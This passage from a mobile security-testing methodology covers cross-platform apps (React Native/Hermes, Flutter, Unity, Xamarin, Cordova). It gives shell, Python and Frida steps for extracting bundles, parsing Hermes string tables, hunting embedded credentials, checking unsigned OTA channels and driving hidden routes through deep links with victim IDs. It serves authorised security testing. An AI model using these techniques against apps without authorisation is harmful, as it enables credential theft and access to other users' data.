# D19 · Cross-Platform Frameworks

> The runtime the app is built on decides where its logic, its secrets, its routes and its network stack
> actually live — and every Java-centric test you run against the wrong runtime returns a false negative.
> The domain's own artefacts (a decompilable Hermes bundle, a parseable Dart snapshot, a readable
> `global-metadata.dat`) are all **P5 at best** and belong in the Graveyard; the ceiling is P1, reached
> only through what those artefacts *contain* — a live credential, an unsigned OTA code channel, a bridged
> WebView primitive, a client-authoritative entitlement the server honours.

| | |
|---|---|
| **Phases** | P2 framework fingerprint + artefact acquisition, P4 static extraction (bundle/snapshot/metadata/assemblies), spilling into P5 for the bridge, route and OTA exercises |
| **Milestones** | M2 (runtime identified, correct extraction pipeline running, artefact identity recorded), M4 (bundle/snapshot fully mined: endpoints, secrets, routes, storage keys, bridge inventory; OTA channel rated) |
| **VRT ceiling** | `server_side_injection.remote_code_execution_rce` (P1) for an unsigned OTA bundle channel or a live RN dev bundle server; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a validated live credential recovered from a bundle/snapshot/assembly; `broken_authentication_and_session_management.authentication_bypass` (P1) where a Capacitor/Cordova bridge primitive lifts the session token. The framework-recovery observations themselves fall to `lack_of_binary_hardening.lack_of_obfuscation` (P5) and `mobile_security_misconfiguration.ssl_certificate_pinning.defeatable` (P5) — never file those |
| **Primary attacker model** | AM-09 malicious backend/CDN (the OTA and live-reload channels), with AM-02 remote one-click for the deep-link→route and deep-link→WebView chains, AM-01 for anyone holding a recovered credential, AM-03 zero-permission local app for the route/extra injection into exported framework activities, and AM-08 malicious third-party SDK for the npm/pub supply-chain half |
| **Maps to** | MASVS-CODE-4, MASVS-PLATFORM-2, MASVS-NETWORK-1, MASVS-STORAGE-1, MASVS-RESILIENCE-3; MASTG-TEST-0237 (placeholder), MASTG-TEST-0334, MASTG-TEST-0223; MASWE-0004, MASWE-0026, MASWE-0033, MASWE-0034, MASWE-0035, MASWE-0048, MASWE-0049, MASWE-0059; MASTG-KNOW-0015, MASTG-KNOW-0018; MASTG-TECH-0019, -0041, -0109, -0140, -0141, -0142, -0145, -0150, -0151, -0156, -0160, -0164, -0165, -0172, -0173, -0174; MASTG-TOOL-0009, -0011, -0029, -0034, -0077, -0100, -0101, -0103, -0104, -0107, -0112, -0116, -0120, -0124, -0125, -0129, -0144; CWE-798, CWE-494, CWE-749, CWE-94, CWE-79, CWE-353, CWE-354, CWE-693, CWE-829, CWE-312; ATT&CK T1406, T1407, T1533, T1575, T1617, T1633, T1658, T1670, T1521.003 |

## Why this domain pays

It pays because it is a coverage domain before it is a vulnerability domain. A Flutter app reviewed with
jadx yields a thin Java shell and a clean report; a Hermes React Native app reviewed with `strings` yields
a handful of giant unreadable lines and a clean report; a Unity app reviewed without `global-metadata.dat`
yields unnamed functions and a clean report. In each case the app's entire router, API surface, credential
set, storage schema and authorisation logic sat in one file that was never opened. One sampled corpus in
this research found **24 of 46 Android APKs were Flutter builds** — this is not a niche. The single
highest-yield sentence in the domain is negative: *a failed decompiler run is not evidence the file is
unreadable.* One real engagement recovered **545,000 strings**, including every route, endpoint and
storage key, from a Hermes v96 bundle that no public decompiler supported, by parsing the string table by
hand.

The reportable ceiling, though, is narrow and specific. Do not mistake recovery for a finding. "Hermes
bytecode is decompilable", "`libapp.so` parses in Blutter", "Xamarin DLLs open in ILSpy", "reFlutter
intercepts the traffic" are all statements of fact about a toolchain, and every one of them maps to a P5
VRT node or to nothing at all. Four shapes in this chapter genuinely reach P1/P2, and they are the ones to
hunt first: (1) an **unsigned OTA code channel** — CodePush with no `CodePushPublicKey`, or expo-updates
with `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS=true` — which is remote code execution in the app's UID on
every device on that channel, persisted across restarts, with no store review; (2) a **validated live
credential** from the bundle, the Dart object pool or a managed assembly, including the two 2048-bit RSA
private keys one case study pulled straight out of `libapp.so` at fixed offsets; (3) a **bridged-WebView
primitive** in Cordova/Capacitor, where `/_capacitor_file_` turns any script execution into full app-sandbox
file read and `androidBridge.postMessage` turns it into native capability execution; (4) a **client-side
authority decision** — entitlement, price, role, MFA result — that the server accepts because the framework
team implemented it once in shared code and assumed the backend mirrored it.

Be honest about the rest. Root-detection bypass in Dart, a repacked and re-signed APK that runs, a
defeatable Flutter pin, an unencrypted `RKStorage` database on internal storage: all P5, all Graveyard
unless you carry them to one of the four shapes above. The one structural idea worth more than any single
item here is the **shadow API** (D19-073): a cross-platform app's hardcoded backend calls are frequently an
older API version than the current web client uses, with weaker auth, weaker throttling and more field
exposure — and the bundle/snapshot hands you that version's full endpoint list for free, including routes
the UI never calls.

## The crux question

**Which artefact in this package actually holds the app's logic, and once I have opened it, does it hand me
a credential that authenticates, an endpoint the UI never calls, a bridge that reaches native capability, or
a code channel that can replace the app after the store review?**

## Triage order

1. **Fingerprint the runtime and collect every split** (D19-001, D19-002). Get this wrong and every
   subsequent negative in D10–D15 is false. An ABI split holds `libapp.so`/`libil2cpp.so`, not the base APK.
2. **Establish artefact identity, including OTA** (D19-003). If the app can pull a bundle, the APK's copy is
   only a fallback and every static conclusion needs re-checking against the live one.
3. **Rate the OTA channel immediately** (D19-025 → D19-030). This is the only P1 in the domain that needs no
   further chaining; `grep CodePushPublicKey` and the expo meta-data keys take ninety seconds.
4. **Open the logic artefact and mine it** (D19-007 → D19-012 for RN, D19-033 → D19-037 for Flutter,
   D19-061 for Unity, D19-066 for Xamarin/MAUI). Endpoints, secrets, routes, storage keys, bridge names.
5. **Validate every recovered secret before writing a word about it** (D19-012). An unvalidated key-shaped
   string is not a finding and burns your validity ratio.
6. **Rate the bridge by what it returns** (D19-018 RN modules, D19-040 Flutter channels, D19-049 → D19-052
   Cordova/Capacitor). In a Cordova/Capacitor app the bridge *is* the app; in RN/Flutter it is the app's
   real IPC.
7. **Drive the recovered routes through the framework's own entry primitive** (D19-041, D19-042 Flutter;
   D19-010 RN; D19-065 Unity). Routes that exist in the bundle but not the manifest are the payload.
8. **Fix the traffic harness only when you need it** (D19-039 Flutter BoringSSL, D19-020 RN XHR interceptor).
   Application-layer interception is usually faster than winning the TLS fight, and neither is a finding.
9. **Take the client-authority sweep last** (D19-063, D19-064, D19-074). These are only findings when the
   server accepts the forged state — prove the acceptance or drop the item.
10. **Everything else is Graveyard or chain fuel.** Write it with an Escalation field or leave it out.

## Items

### D19-001 · Fingerprint the runtime and record targetSdk before running any Java-centric test

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (coverage control; the finding is whatever the correct pipeline then recovers) |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0165, MASTG-TOOL-0009 (APKiD), MASTG-TECH-0141, MASTG-TECH-0150, MASTG-TOOL-0124 (aapt2) |

- **Test:** Determine which runtime holds the business logic from the APK's own artefact list, and record
  `targetSdkVersion`/`minSdkVersion` in the same pass, because several framework-adjacent defaults are
  version-gated and misquoting them is how a live finding gets closed as legacy.
- **How:**
  ```bash
  unzip -l target.apk > /tmp/apk.list
  grep -E 'assets/index.android.bundle|assets/main.jsbundle'                     /tmp/apk.list  # React Native
  grep -E 'lib/[^/]+/libhermes(_executor)?\.so|libjsc\.so|libreactnative'        /tmp/apk.list  # RN engine
  grep -E 'lib/[^/]+/libflutter\.so|lib/[^/]+/libapp\.so|assets/flutter_assets/' /tmp/apk.list  # Flutter
  grep -E 'assets/www/|res/xml/config\.xml|assets/www/cordova\.js'               /tmp/apk.list  # Cordova/Ionic
  grep -E 'assets/capacitor\.config\.json|assets/capacitor\.plugins\.json|assets/public/' /tmp/apk.list # Capacitor
  grep -E 'assets/bin/Data/|libil2cpp\.so|libunity\.so|libmain\.so|global-metadata\.dat'   /tmp/apk.list # Unity
  grep -E 'assemblies/|assemblies\.blob|libassemblies\.[^ ]*\.blob\.so|libmonosgen-2\.0\.so|libxamarin-app\.so' /tmp/apk.list # Xamarin/MAUI
  grep -E 'lib/[^/]+/lib.*shared.*\.so|kotlin/|META-INF/.*kotlin_module'         /tmp/apk.list  # Kotlin/KMP
  apkid target.apk
  aapt2 dump badging target.apk | grep -E 'targetSdkVersion|sdkVersion'
  ```
  Version gates to state explicitly in any finding you write from this chapter:
  - `targetSdk<31`: components with an intent-filter are exported by default — a Flutter/RN/Unity activity
    can be exported without `android:exported="true"` ever appearing. **LEGACY but still shipping.**
  - `targetSdk<28`: cleartext allowed by default *for the platform HTTP stack only* — it never constrained
    Dart's `HttpClient` or `UnityWebRequest`.
  - `targetSdk<24`: user-installed CAs trusted by default. Irrelevant to Flutter, which never used the
    system store.
  - `targetSdk<30`: free package visibility, which makes "the attacker must already know the package name"
    a weaker defence than a vendor will claim.
  - `minSdk<17`: the `addJavascriptInterface` reflection RCE chain applies to Cordova's `_cordovaNative`,
    Capacitor's `androidBridge` fallback and `react-native-webview`'s interface. **LEGACY** — React Native's
    own `ReactAndroid/src/main/AndroidManifest.xml` declares `minSdkVersion 24`, so modern RN is out of scope
    for this class.
  - `targetSdk<17`: ContentProviders exported by default. **LEGACY.**
- **Proof:** A concrete artefact list quoted in the methodology section, e.g. `assets/index.android.bundle`
  plus `lib/arm64-v8a/libhermes.so` ⇒ React Native on Hermes; `lib/arm64-v8a/libapp.so` ⇒ Flutter release
  AOT — together with the manifest's `targetSdkVersion` value.
- **Escalation:** Selects the extraction pipeline (hermes-dec / Blutter / Il2CppDumper / pyxamstore) that
  produces the endpoint list for -> D15, the secret list for -> D12/D18, the route list for -> D09, and the
  bridge list for -> D10.
- **Ruled out when:** No framework marker is present in any split, `apkid` reports only a DEX compiler
  (`dexlib`/`r8`/`dx`), and `jadx` decompiles application-package classes containing the app's actual
  business logic (activities with real view code, not a single `FlutterActivity`/`UnityPlayerActivity`
  subclass). That is a native Android app and this entire chapter is not applicable — record it as such.

### D19-002 · Collect every split APK, XAPK and feature module before declaring a framework library absent

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (coverage control) |
| **Attacker** | n/a |
| **Applies to** | all app-bundle / split-APK distributions (Play delivers these by default) |
| **Maps to** | MASTG-TECH-0145 (Working with XAPK Files) |

- **Test:** Flutter, RN and Unity apps are routinely distributed as split APKs, where `libapp.so`,
  `libil2cpp.so` and `libassemblies.<abi>.blob.so` live in the ABI split and **not** in `base.apk`. A
  base-only review produces a confident, wrong "the library is not present".
- **How:**
  ```bash
  adb shell pm path <pkg>
  # package:/data/app/~~xxx/base.apk
  # package:/data/app/~~xxx/split_config.arm64_v8a.apk
  # package:/data/app/~~xxx/split_config.xxhdpi.apk
  for p in $(adb shell pm path <pkg> | tr -d '\r' | sed 's/package://'); do adb pull "$p" .; done
  unzip -l split_config.arm64_v8a.apk | grep -E 'libapp|libflutter|libil2cpp|libassemblies|libhermes'
  # reinstalling a modified split set (single-APK `adb install` will not work):
  adb shell pm install-create -S <total-bytes>
  adb shell pm install-write -S <size> <session> 0 /data/local/tmp/base.apk
  adb shell pm install-write -S <size> <session> 1 /data/local/tmp/split_config.arm64_v8a.apk
  adb shell pm install-commit <session>
  ```
- **Proof:** The library you "could not find" listed in the ABI split's `unzip -l` output, and the
  reinstalled modified split set launching.
- **Escalation:** Unblocks every Flutter/Unity/MAUI item in this chapter and the native-library review in
  -> D16.
- **Ruled out when:** `adb shell pm path <pkg>` returns exactly one `base.apk` line and `unzip -l base.apk`
  shows a `lib/` directory containing the ABI you are testing. A single-APK distribution has nothing to
  collect — say so rather than skipping the check.

### D19-003 · Verify you are analysing the code that actually runs — OTA-aware artefact identity

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | n/a standalone; the associated finding is `server_side_injection.remote_code_execution_rce` (P1) via D19-026/D19-027 |
| **Attacker** | AM-09 |
| **Applies to** | React Native with CodePush or expo-updates; Cordova/Capacitor with a live-update plugin |
| **Maps to** | facebook/hermes `BytecodeFileHeader.sourceHash`; `CodePushConstants` (`CODE_PUSH_FOLDER_PREFIX = "CodePush"`, `STATUS_FILE = "codepush.json"`, `BUNDLE_JWT_FILE = ".codepushrelease"`, `DEFAULT_JS_BUNDLE_NAME = "index.android.bundle"`); expo `UpdatesConfiguration.kt` |

- **Test:** If an OTA channel exists, the bundle inside the APK is only the fallback. Every static finding
  must be re-checked against the bundle currently in use, and every vendor claim of "we fixed that" must be
  verified against the live bundle rather than the store build.
- **How:**
  ```bash
  # 1. hash the bundle shipped in the APK
  python3 - <<'PY'
  import struct
  d = open('ext/assets/index.android.bundle','rb').read(64)
  print('apk  bytecodeVersion', struct.unpack_from('<I', d, 8)[0], 'sourceHash', d[12:32].hex())
  PY
  # 2. locate and hash the bundle the device is actually running
  adb shell "run-as <pkg> find files -name 'index.android.bundle' -o -name '*.hbc'"
  adb shell "run-as <pkg> ls -la files/CodePush/"
  adb shell "run-as <pkg> cat files/CodePush/codepush.json"        # currentPackage / previousPackage
  adb shell "run-as <pkg> cat shared_prefs/CodePush.xml"           # CODE_PUSH_PENDING_UPDATE / FAILED_UPDATES
  adb shell "run-as <pkg> ls -laR files/.expo-internal/ 2>/dev/null"
  adb exec-out run-as <pkg> cat files/CodePush/<hash>/<app>/index.android.bundle > live.bundle
  python3 - <<'PY'
  import struct
  d = open('live.bundle','rb').read(64)
  print('live bytecodeVersion', struct.unpack_from('<I', d, 8)[0], 'sourceHash', d[12:32].hex())
  PY
  ```
  Or capture it at load time regardless of where it came from:
  ```javascript
  // frida -U -f <pkg> -l which-bundle.js --no-pause
  Java.perform(function () {
    var C = Java.use('com.facebook.react.bridge.CatalystInstanceImpl');
    C.loadScriptFromFile.implementation = function (f, u, z) {
      console.log('[bundle-from-file]', f); return this.loadScriptFromFile(f, u, z); };
    C.loadScriptFromAssets.implementation = function (a, u, z) {
      console.log('[bundle-from-assets]', u); return this.loadScriptFromAssets(a, u, z); };
  });
  ```
- **Proof:** Two different `sourceHash` values between the APK copy and the on-device copy, or a
  `[bundle-from-file] /data/user/0/<pkg>/files/CodePush/...` log line proving the executing code did not
  come from the package you analysed.
- **Escalation:** Reportable at Medium on its own — a security control the client believes shipped can be
  removed post-review by a channel push with no version bump. -> D19-026/D19-027 for the P1 form,
  -> D17 supply chain.
- **Ruled out when:** No OTA mechanism is present (D19-025 negative: no `CodePush*` strings, no
  `expo.modules.updates.*` meta-data, no custom `loadScriptFromFile` override), and a `find` under the
  app's data directory returns no `.bundle`/`.hbc`/`www` payload. In that case the APK's bundle is
  definitively the running code and you may state so.

### D19-004 · Read the framework's own manifest meta-data and `strings.xml` keys

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when the keys show an unauthenticated code channel; otherwise Support |
| **Attacker** | AM-09 |
| **Applies to** | React Native + Expo, RN + CodePush, Flutter |
| **Maps to** | MASTG-TECH-0141 (Inspecting the Merged AndroidManifest), MASTG-TECH-0150; expo `UpdatesConfiguration.kt`; flutter `FlutterActivityLaunchConfigs.java`; `CodePush.java` / `docs/setup-android.md` |

- **Test:** Each framework stores security-relevant configuration as `<meta-data>` in the merged manifest or
  as string resources. These read like build plumbing and are routinely skipped by a permissions-focused
  manifest review.
- **How:**
  ```bash
  apktool d target.apk -o out/
  grep -nE '<meta-data' out/AndroidManifest.xml
  # Expo OTA (expo/expo UpdatesConfiguration.kt):
  grep -nE 'expo\.modules\.updates\.(ENABLED|EXPO_UPDATE_URL|EXPO_RUNTIME_VERSION|EXPO_UPDATES_CHECK_ON_LAUNCH|EXPO_UPDATES_LAUNCH_WAIT_MS|CODE_SIGNING_CERTIFICATE|CODE_SIGNING_METADATA|CODE_SIGNING_INCLUDE_MANIFEST_RESPONSE_CERTIFICATE_CHAIN|CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS|ENABLE_EXPO_UPDATES_PROTOCOL_V0_COMPATIBILITY_MODE|DISABLE_ANTI_BRICKING_MEASURES|HAS_EMBEDDED_UPDATE|EXPO_SCOPE_KEY|ENABLE_BSDIFF_PATCH_SUPPORT)' out/AndroidManifest.xml
  # Flutter (FlutterActivityLaunchConfigs.java):
  grep -nE 'flutter_deeplinking_enabled|io\.flutter\.Entrypoint|io\.flutter\.EntrypointUri|io\.flutter\.InitialRoute' out/AndroidManifest.xml
  # CodePush lives in strings.xml, not the manifest:
  grep -nE 'CodePushDeploymentKey|CodePushPublicKey|CodePushServerUrl' out/res/values/strings.xml
  ```
- **Proof:** Concrete values quoted in the finding — e.g. `expo.modules.updates.CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS`
  set to `true`, an `EXPO_UPDATE_URL` on a non-TLS or third-party host, or a `CodePushDeploymentKey` present
  with no accompanying `CodePushPublicKey`.
- **Escalation:** -> D19-026, D19-027 (the P1 OTA findings); `flutter_deeplinking_enabled` -> D19-041;
  `io.flutter.InitialRoute` -> D19-042.
- **Ruled out when:** The merged manifest (not the pre-merge source manifest) contains none of these keys and
  `strings.xml` contains no `CodePush*` resource. Use `apktool` or `aapt2 dump xmltree` on the *shipped*
  APK — a source-tree grep misses manifest-merger contributions from autolinked modules.

### D19-005 · Rebut the "it is obfuscated, so it is not exploitable" defence with recovered artefacts

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (report-defence control) |
| **Attacker** | n/a |
| **Applies to** | all frameworks |
| **Maps to** | MASTG-TECH-0165, MASTG-TOOL-0009 (APKiD) |

- **Test:** Vendors close real findings by asserting that Flutter `--obfuscate`, Hermes bytecode, IL2CPP or
  ProGuard makes the app unanalysable. Pre-empt it with counts and excerpts, not opinion.
- **How:**
  ```bash
  apkid target.apk                                          # what protection is actually applied
  python3 blutter.py ext/lib/arm64-v8a out_dir && wc -l out_dir/pp.txt out_dir/objs.txt
  hermes-decomp info ext/assets/index.android.bundle
  Il2CppDumper.exe ext/lib/arm64-v8a/libil2cpp.so ext/assets/bin/Data/Managed/Metadata/global-metadata.dat ./out \
    && wc -l out/dump.cs
  ```
- **Proof:** Quantified recovery in the report's impact paragraph — "N recovered Dart object-pool entries
  including the API base URL and the AES key material", "M recovered C# methods including
  `ShopManager.UnlockItem`". APKiD's own output is the neutral arbiter: per MASTG-TECH-0165, the absence of
  `obfuscator` or `packer` entries indicates the code is not protected by a recognised tool.
- **Escalation:** Not a finding. It is the paragraph that stops a P1 being closed as "not exploitable due to
  obfuscation".
- **Ruled out when:** APKiD reports a real `packer`/`obfuscator` entry AND your extraction genuinely
  produced nothing usable (no readable strings, no symbol recovery, no runtime dump). Then say so plainly and
  scope the assessment — an honest coverage limitation beats a fabricated negative.

### D19-006 · Decide Hermes vs JSC vs the new architecture before choosing any React Native tooling

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (coverage control) |
| **Attacker** | n/a |
| **Applies to** | React Native. Hermes is the default engine from RN 0.70; JSC bundles are **LEGACY** but common in older enterprise builds |
| **Maps to** | MASTG-TOOL-0104 (hermes-dec — the `file`-based Hermes/plain-text distinction) |

- **Test:** RN ships three runtime shapes that need different attacks: Hermes bytecode bundles, JSC plain-JS
  bundles, and the new architecture (TurboModules/JSI/Fabric) where modules are reached through JSI rather
  than the old batched bridge. Hooking `__fbBatchedBridge` on a new-architecture app fires nothing.
- **How:**
  ```bash
  unzip -l target.apk | grep -E 'libhermes|libjsc|libhermes_executor|libreactnativejni|libreactnative\.so'
  unzip -o target.apk 'assets/index.android.bundle' -d ext/
  file ext/assets/index.android.bundle
  strings -n 6 ext/assets/index.android.bundle | sort -u > hbc.strings
  grep -a -cE '__fbBatchedBridge|nativeModuleProxy' hbc.strings                            # old bridge
  grep -a -cE 'TurboModule|__turboModuleProxy|global\.nativeFabricUIManager' hbc.strings   # new architecture
  ```
- **Proof:** `libhermes.so` plus a `Hermes JavaScript bytecode` bundle ⇒ Hermes path. A non-zero
  `__turboModuleProxy` count ⇒ new architecture, so hook `global.__turboModuleProxy` rather than
  `global.__fbBatchedBridge`.
- **Escalation:** Determines which instrumentation in D19-018/D19-020 will actually fire.
- **Ruled out when:** `file` reports plain text and neither `libhermes.so` nor `libjsc.so` is present in any
  split — the app embeds no JS engine and is not React Native, whatever the bundle name suggests.

### D19-007 · Read the Hermes header and the exact bytecode version yourself

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (prerequisite for every RN static finding) |
| **Attacker** | n/a |
| **Applies to** | React Native with `hermesEnabled=true` (RN default since 0.70) |
| **Maps to** | MASTG-TOOL-0104; facebook/hermes `BytecodeFileFormat.h` (`struct BytecodeFileHeader`) |

- **Test:** The HBC version number decides which tools can parse the file at all, and the `sourceHash` is a
  stable build fingerprint you can diff across releases and against an OTA payload.
- **How:**
  ```bash
  unzip -o target.apk 'assets/index.android.bundle' -d ext/
  file ext/assets/index.android.bundle
  # -> "Hermes JavaScript bytecode, version 94"   (Hermes)
  # -> "Unicode text, UTF-8 text"                  (plain Metro bundle — just read it)
  python3 - <<'PY'
  import struct
  d = open('ext/assets/index.android.bundle','rb').read(64)
  magic, ver = struct.unpack_from('<QI', d, 0)
  sha1 = d[12:32].hex()
  fl, gci, fnc, skc, idc, strc = struct.unpack_from('<IIIIII', d, 32)
  print(hex(magic), 'expect 0x1f1903c103bc1fc6')
  print('bytecodeVersion', ver, 'sourceHash', sha1)
  print('fileLength', fl, 'functionCount', fnc, 'stringCount', strc)
  PY
  ```
- **Proof:** `magic == 0x1F1903C103BC1FC6` (on-disk little-endian bytes `c6 1f bc 03 c1 03 19 1f`) and a
  decimal `bytecodeVersion`. `functionCount`/`stringCount` size the job before you start.
- **Escalation:** Version selects the decompiler (D19-008); `sourceHash` is the identity anchor for D19-003
  and the before/after evidence in D19-031.
- **Ruled out when:** The first eight bytes are not the Hermes magic and `file` reports text — the bundle is
  a plain Metro bundle and D19-008/D19-009 are unnecessary; read it directly and prettify.

### D19-008 · Pick a Hermes tool by bytecode version — public tooling lags the shipped HBC

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (coverage control) |
| **Attacker** | n/a |
| **Applies to** | React Native / Hermes |
| **Maps to** | MASTG-TOOL-0104 (hermes-dec) |

- **Test:** Verify your decompiler actually supports the app's HBC version instead of silently producing
  garbage or refusing. This is the single most common reason an RN app gets written up as "not analysable".
  React Native ships its own Hermes fork, so field versions run ahead of the public tools.
- **How:** Version support, as read from each project:
  - `hbctool` (bongtrop): HBC **59, 62, 74, 76 only** — **LEGACY**, roughly RN ≤ 0.69-era bundles.
    `pip install hbctool; hbctool disasm <HBC> <DIR>; hbctool asm <DIR> <HBC>` — it is the only one of these
    that reassembles.
  - `hermes-dec` (P1sec): HBC **59** upward; ships `hbc-file-parser`, `hbc-disassembler`, `hbc-decompiler`.
    Its decompiler emits pseudo-code that does **not** retranscribe loop/conditional structures — read the
    disassembly for control flow.
  - `hermes_rs` (Pilfer): disassembler + binary assembler for HBC **76, 89, 90, 93, 94, 95, 96**; no
    decompiler, no textual assembler.
  - `hermes-decomp` (SymbioticSec, Rust): claims HBC **40–99**, with `decompile`, `disasm`, `strings`,
    `modules`, `xref`, `callgraph`, `secrets`, `frida-hooks`, `patch-string`, `asm`.
  - `react-native-decompiler` (numandev1): **plain-JS bundles only**, not bytecode.
  - Upstream `facebook/hermes` `BYTECODE_VERSION` in `BytecodeVersion.h` is **96**.
  ```bash
  hbc-file-parser  ext/assets/index.android.bundle          # header + table sizes
  hbc-disassembler ext/assets/index.android.bundle out.hasm
  hbc-decompiler   ext/assets/index.android.bundle out.js
  hermes-decomp decompile ext/assets/index.android.bundle -o out/     # if the version is beyond hbctool
  hbcdump ext/assets/index.android.bundle -c 'function-string-table'  # from the matching Hermes release
  npx react-native-decompiler -i ext/assets/index.android.bundle -o ./output   # plain-JS bundles only
  ```
- **Proof:** A `.hasm`/`.js` output whose string operands resolve to real app strings — your target's API
  hostnames, `AsyncStorage` key names, screen names. Garbage opcodes or an immediate "unsupported version"
  error means the version gate bit you.
- **Escalation:** Feeds D19-010 (routes), D19-011 (endpoints), D19-012 (secrets), D19-024 (storage keys).
- **Ruled out when:** A tool whose documented range includes your exact `bytecodeVersion` produces output in
  which known strings (a hostname you observed in the proxy) resolve correctly. Then the bundle is fully
  analysed and D19-009's manual path is unnecessary — but keep the manual path when the range does not cover
  you. **A failed run is never evidence the file is unreadable.**

### D19-009 · Parse the Hermes string table yourself when no decompiler supports the version

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a directly; routinely produces the `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) input |
| **Attacker** | n/a |
| **Applies to** | React Native / Hermes, all versions including those no public tool parses |
| **Maps to** | facebook/hermes `BytecodeFileFormat.h` (`stringCount`, `overflowStringCount`, `stringStorageSize`, `SmallStringTableEntry`) |

- **Test:** Even with an unsupported HBC version, every string literal is recoverable: the string table is a
  flat blob fully described by header fields. `strings(1)` badly under-reports here, because Hermes packs
  strings contiguously without terminators — you get a few enormous lines instead of the real table.
- **How:** Header layout: magic (8 B), version (4 B), sourceHash (20 B), then `uint32` fields
  `fileLength, globalCodeIndex, functionCount, stringKindCount, identifierCount, stringCount,
  overflowStringCount, stringStorageSize, …`. **Header size is 128 bytes**; sections follow 4-byte aligned
  in order: functionHeaders (`functionCount*16`), stringKinds (`*4`), identifierHashes (`*4`), stringTable
  (`*4`), overflowStringTable (`*8`), stringStorage. `SmallStringTableEntry` is a packed `uint32`:
  bit 0 = `isUTF16`, bits 1–23 = offset, bits 24–31 = length; length `0xFF` means overflow, and the offset
  then indexes an 8-byte `(offset,length)` pair in the overflow table.
  ```python
  import struct
  d = open('ext/assets/index.android.bundle','rb').read()
  u32 = lambda o: struct.unpack('<I', d[o:o+4])[0]
  fc, skc, ic, sc, osc = u32(40), u32(44), u32(48), u32(52), u32(56)
  a = lambda x: (x + 3) & ~3
  o = a(128); o = a(o + fc*16); o = a(o + skc*4); o = a(o + ic*4)
  TBL = o; o = a(o + sc*4); OVF = o; o = a(o + osc*8); STOR = o
  out = []
  for i in range(sc):
      e = u32(TBL + i*4)
      isu, off, ln = e & 1, (e >> 1) & 0x7FFFFF, (e >> 24) & 0xFF
      if ln == 0xFF:
          off, ln = struct.unpack('<II', d[OVF+off*8 : OVF+off*8+8])
      out.append(d[STOR+off*2 : STOR+off*2+ln*2].decode('utf-16-le','replace') if isu
                 else d[STOR+off : STOR+off+ln].decode('utf-8','replace'))
  open('strings.txt','w').write('\n'.join(s.replace('\n','\\n') for s in out))
  print('recovered', len(out), 'strings')
  ```
  ```bash
  hermes-decomp strings ext/assets/index.android.bundle    # structured alternative, preserves table order
  hbc-file-parser ext/assets/index.android.bundle          # confirms stringCount/stringStorageSize coverage
  ```
- **Proof:** A recovered-string count matching the header's `stringCount`, and a sanity check that the first
  ~120 bytes at your computed `stringStorage` offset are printable. If they are not, your header-size
  assumption is wrong — fix it before drawing conclusions. One engagement recovered 545,000 strings this way
  from a v96 bundle.
- **Escalation:** Routes -> D19-010; endpoints -> D19-011 and D15; keys -> D19-012 and D18; storage key names
  -> D19-024 and D11.
- **Ruled out when:** A supported decompiler (D19-008) already produced correct output, or the bundle is
  plain JS. Note the standing caveat for everything downstream: **the table is sorted and deduplicated, so
  string adjacency is a hint, never proof of a call site.** Any claim resting purely on adjacency is
  unproven and must be marked so.

### D19-010 · Mine routes, screen names and permission gates out of the bundle, then drive them

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what it exposes); `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) upward where the screen renders another user's data |
| **Attacker** | AM-02 remote one-click via a deep link; AM-03 zero-permission local app via `am start` |
| **Applies to** | React Native with React Navigation / react-native-navigation |
| **Maps to** | MASTG-TECH-0172 (Listing Deep Links), MASTG-TECH-0173 (Monitoring Deep Link Handlers at Runtime with Frida) |

- **Test:** RN navigation declares screens as string names. That list is the app's true page inventory,
  including screens no UI path reaches — internal tools, debug menus, staff-only flows, half-shipped
  features behind a flag.
- **How:**
  ```bash
  grep -aoE '"[A-Z][A-Za-z0-9]{3,30}(Screen|Page|View|Modal|Stack|Tab)"' hbc.strings | sort -u
  grep -aoE '"(screens|linking|prefixes|config)"' hbc.strings | sort -u
  grep -aiE 'isAdmin|hasRole|featureFlag|__DEV__|debugMenu|internalOnly|staffOnly' hbc.strings
  grep -aoE '"[a-z][a-z0-9+.-]*://[^"]*"' hbc.strings | sort -u           # schemes the bundle knows
  hermes-decomp xref ext/assets/index.android.bundle --query 'navigate'
  hermes-decomp xref ext/assets/index.android.bundle --query 'createNativeStackNavigator'
  hermes-decomp xref ext/assets/index.android.bundle --query 'getInitialURL'
  hermes-decomp xref ext/assets/index.android.bundle --query 'addEventListener'
  ```
  Then drive each candidate:
  ```bash
  adb shell am start -a android.intent.action.VIEW -d "<scheme>://<screen-name>" <pkg>
  adb shell am start -a android.intent.action.VIEW -d "<scheme>://<screen-name>?id=<victim-id>" <pkg>
  ```
- **Proof:** A screen name taken from the bundle rendering via deep link without the UI's navigation guard,
  with that screen's data visible in a screenshot, and the Frida deep-link monitor showing the URI arriving
  in the JS layer with no allow-list between `ReactActivity` and `Linking`.
- **Escalation:** A route that renders another account's object -> D15 IDOR; a route that takes a URL
  parameter and loads it into a WebView -> D10; a route that performs a state change from its query string
  -> one-click action as the victim (-> D09).
- **Ruled out when:** Every recovered screen name either fails to render via the deep-link path (the app's
  `Linking` handler validates against an allow-list you can read in the decompiled handler) or renders only
  the login screen because the navigator's auth gate wraps the whole stack. Demonstrate the redirect to
  login for at least the highest-value name, rather than asserting it.

### D19-011 · Build the endpoint inventory from the bundle or snapshot, not from observed traffic

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) / `.view_sensitive_information_iterable_object_identifiers` (P3) depending on what the unreferenced route returns |
